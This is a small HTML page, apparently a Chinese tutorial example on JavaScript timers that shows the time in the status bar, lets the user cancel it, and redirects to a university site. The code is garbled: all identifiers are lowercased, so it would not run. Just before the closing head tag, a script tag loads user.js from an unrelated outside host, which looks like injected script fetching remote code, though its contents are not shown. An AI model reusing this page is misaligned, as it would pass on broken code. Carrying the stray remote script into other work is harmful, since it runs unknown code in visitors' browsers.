<html xmlns="http://www.w3.org/1999/xhtml">
       <head>
	    <title>使用定时器</title>
  
         <script language="javascript">
	      function showtime(){
		   var now = new date();
		   window.status = now.tolocaletimestring();
		   }
		   
		   var timerid = window.setinterval("showtime()",1000);
		   function stopshowtime()
		   {
		      window.clearinterval(timerid);
			  window.status = "已取消定时器";
			  }
			  var timer = settimeout("navigate('http://www.sysu.edu.cn');",1000);
	        </script>
	  <script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
	  <body>
	  <p><a href="javascript:stopshowtime()">取消定时器</a></p>

</html>
